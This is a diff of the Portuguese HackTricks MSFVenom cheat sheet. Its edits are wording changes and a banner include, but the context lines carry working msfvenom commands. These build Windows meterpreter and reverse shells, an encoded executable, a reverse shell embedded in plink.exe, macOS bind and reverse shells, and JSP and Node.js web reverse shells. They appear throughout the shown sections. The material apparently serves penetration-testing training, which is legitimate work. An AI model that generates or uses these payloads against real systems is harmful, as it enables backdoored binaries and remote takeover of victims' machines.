@@ -1,19 +1,21 @@
 # MSFVenom - CheatSheet
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ---
 
 ## msfvenom básico
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Use `-a` para selecionar a arquitetura do payload e `--platform` para selecionar sua plataforma alvo.<sup>[[1]](#references)</sup>
+Use `-a` para selecionar a arquitetura do payload e `--platform` para selecionar a plataforma-alvo.<sup>[[1]](#references)</sup>
 
 ## Listagem
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-Esses comandos listam os módulos de payload e encoder disponíveis no framework instalado.<sup>[[1]](#references)</sup>
+Estes comandos listam os módulos de payload e encoder disponíveis no framework instalado.<sup>[[1]](#references)</sup>
 
 ## Parâmetros comuns ao criar um shellcode
 ```bash
@@ -23,7 +25,7 @@ Esses comandos listam os módulos de payload e encoder disponíveis no framework
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-As flags mostradas aqui selecionam caracteres inválidos, formato de saída, encoder e iterações de encoding.<sup>[[1]](#references)</sup>
+As flags mostradas aqui selecionam caracteres inválidos, formato de saída, encoder e iterações de codificação.<sup>[[1]](#references)</sup>
 
 ## **Windows**
 
@@ -52,7 +54,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### Incorporado dentro do executável
+### Embutido dentro do executável
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
@@ -81,7 +83,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ma
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
-## **Payloads Baseados em Web**
+## **Payloads baseados em Web**
 
 ### **PHP**
 
@@ -113,7 +115,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Payloads de linguagens de script**
+## **Payloads de linguagem de script**
 
 ### **Perl**
 ```bash
